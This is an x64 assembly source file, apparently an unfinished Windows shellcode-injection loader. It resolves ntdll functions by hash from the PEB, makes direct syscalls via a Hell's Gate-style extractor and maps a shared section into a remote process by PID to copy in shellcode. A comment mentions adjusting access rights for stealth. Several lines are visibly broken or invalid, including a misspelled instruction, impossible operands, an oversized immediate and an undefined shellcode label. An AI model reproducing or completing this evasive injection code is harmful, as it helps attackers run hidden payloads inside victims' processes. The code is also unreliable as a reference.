global _start

section .text

_start:
    cld
    jmp _NtYieldExecution

;this is hash function
;=========================
_hash_unicode:
    xor r9, r9
    xor rbx, rbx
    xor rax,rax
loop1:
    lodsb
    cmp al,0x61
    jl lawercase1
    sub al,0x20
lawercase1:
    mov bl, al
    add al, al
    xor al, bl   
    add r9d, eax
    push rcx
    mov cl,bl
    ror r9d, cl     
    pop rcx
    loop loop1
    ret
;==========================
;this is hash function
;=========================
_hash_ascci:
    push rcx
    xor r9, r9
    xor rbx, rbx
    xor rax,rax
loop2:
    lodsb
    cmp al,0x61
    jl lawercase2
    sub al,0x20
lawercase2:
    mov bl, al
    add al, al
    xor al, bl   
    add r9d, eax
    mov cl,bl
    ror r9d, cl
    test bl,bl
    jnz loop2
    pop rcx
    ret
;==========================

;function to extract syscalls using hell's gate input is r10d
_syscallExtracter:
    pop rbp
    push r10 
    push rdx
    push r8 
    push r9
    mov r10d,eax
    xor rdx,rdx
    mov rdx,[gs:rdx+0x60]
    mov rdx,[rdx+0x18]
    mov rdx,[rdx+0x20]
getModulName:
    mov rsi,[rdx+0x50] ;ntdll.dll
    movzx rcx,word [rdx+0x4a]
    call _hash_unicode
    cmp r9d,0x2bc46ff9 ; hash of "ntdll.dll"
    jz getfuncName
    mov rdx,[rdx]
    jmp getModulName

getfuncName:
    push rdx ;push base of modul
    push r9 ;push ntdll.dll hash value to stack
    mov rdx,[rdx+0x20]
    mov eax,[rdx+0x3c]
    add rax,rdx
    mov eax,[rax+0x88]
    test rax,rax
    add rax,rdx
    push rax
    mov ecx,[rax+0x18]
    mov r8d,[rax+0x20]
    add r8,rdx
extract_loop:
    jrcxz end_extract
    dec rcx
    mov esi,[r8+rcx*4]
    add rsi,rdx
    call _hash_ascci
    add r9,[rsp+8]
    cmp r9d,r10d
    jnz extract_loop
    pop rax
    mov r8d,[rax+0x24]
    add r8,rdx
    mov cx,[r8+rcx*2]
    mov r8d,[rax+0x1c]
    add r8,rdx
    mov eax,[r8+rcx*4]
    add rax,rdx
    mov ebx,[rax]
    cmp ebx,0xb8d18b4c
    jnz end_extract
    mov eax,[rax+4]
    pop r10
    pop rdx
    pop r8
    pop r9
    syscall
end_extract:
    jmp rbp

_NtYieldExecution:
    mov r10,0
    mov eax,0x6AC2118A ; NtYieldExecution
    call _syscallExtracter ;call derect syscall
    test rax,rax
    jnz done
    mov rax,"(y)\n"

done:
    mov rax,"error\n"

;========================
;========================

create_shared_section:
    
    mov rbp,rsp ; save rsp this time rbp use as a normal register
    sub rsp,0x1a0 
    mov r11,rsp ;section handler variable
    psuh 0x1000
    mov r12,rsp ;Max Size varible
    sub rsp,0x1a0
    mov r13,rsp ;base adress
    mov rsp,rbp ;restore rsp

    lea rcx,r11 ; setting up Section HANDLE argument        

    ; RDX = DesiredAccess
    mov rdx, 0xF001F                    ; SECTION_ALL_ACCESS

    ; R8 = ObjectAttributes = NULL
    xor r8, r8                         

    ; R9 = &MaximumSize (LARGE_INTEGER)
    lea r9,r12          
    
    sub rsp, 0x28 + 0x20                ; Shadow space + alignment

    mov qword [rsp+0x28], 0x04          ; PAGE_READWRITE
    mov qword [rsp+0x30], 0x08000000    ; SEC_COMMIT

    xor rax, rax
    mov [rsp+0x38], rax                 ; FileHandle = NULL

    mov r10,rcx
    mov eax,0xB5578F84 ; NtCreateSection
    call _syscallExtracter ;call derect syscall

    add rsp, 0x28 + 0x20                ; Clean up the stack
    ret

map_view:
    ; RCX = SectionHandle
    mov rcx, r11

    ; RDX = ProcessHandle (-1 = current process)
    mov rdx, -1

    ; R8 = &BaseAddress (OUT)
    lea r8,r13

    ; R9 = ZeroBits
    xor r9, r9

    sub rsp, 0x28 + 0x30

    mov qword [rsp+0x28], 0                  ; CommitSize = 0
    xor rax, rax
    mov [rsp+0x30], rax                      ; SectionOffset = NULL
    lea rax,r12
    mov [rsp+0x38], rax                      ; ViewSize
    mov qword [rsp+0x40], 2                  ; InheritDisposition = ViewUnmap
    mov qword [rsp+0x48], 0                  ; AllocationType = 0
    mov qword [rsp+0x50], 0x04               ; PAGE_READWRITE

    mov r10,rcx
    mov eax,0x8D1701C9 ; NtMapViewOfSection
    call _syscallExtracter ;call derect syscall

    add rsp, 0x28 + 0x30
    ret

mem_copy:
    lea rsi, [rel myshellcode]
    mov rcx, shellcode_size
    mov rdi,r13     ; Mapped section destination
    cld
    rep movsb

open_remote_process:
    ; RCX = out HANDLE
    lea rcx,[r11 - 0x08]

    ; RDX = DesiredAccess
    mov rdx, 0x1FFFFF                   ; PROCESS_ALL_ACCESS (for testing; adjust for stealth)

    ; R8 = &ObjectAttributes
    lea r8, [rel ObjectAttributes]

    ; R9 = &ClientID
    lea r9, [rel ClientID]

    mov r10,rcx
    mov eax,0x1060998A8 ; NtOpenProcess
    call _syscallExtracter ;call derect syscall
    ret


map_view_remote:
    ; RCX = SectionHandle
    mov rcx,r11

    ; RDX = ProcessHandle (-1 = current process)
    lea rdx,[r11 - 0x08]

    ; R8 = &BaseAddress (OUT)
    lea r8,r13

    ; R9 = ZeroBits
    xor r9, r9

    sub rsp, 0x28 + 0x30

    mov qword [rsp+0x28], 0                  ; CommitSize = 0
    xor rax, rax
    mov [rsp+0x30], rax                      ; SectionOffset = NULL
    lea rax,r12
    mov [rsp+0x38], rax                      ; ViewSize
    mov qword [rsp+0x40], 1                  ; InheritDisposition = ViewUnmap
    mov qword [rsp+0x48], 0                  ; AllocationType = 0
    mov qword [rsp+0x50], 0x40               ; PAGE_READWRITE

    mov r10,rcx
    mov eax,0x8D1701C9 ; NtMapViewOfSection
    call _syscallExtracter ;call derect syscall

    add rsp, 0x28 + 0x30
    ret








;RAW DATA
;======================================
ClientID:
    dq 1234                             ; UniqueProcess = PID
    dq 0                                ; UniqueThread = NULL

ObjectAttributes:
    dq 48                               ; Length = sizeof(OBJECT_ATTRIBUTES)
    dq 0                                ; RootDirectory = NULL
    dq 0                                ; ObjectName = NULL
    dq 0                                ; Attributes = 0
    dq 0                                ; SecurityDescriptor
    dq 0                                ; SecurityQualityOfService

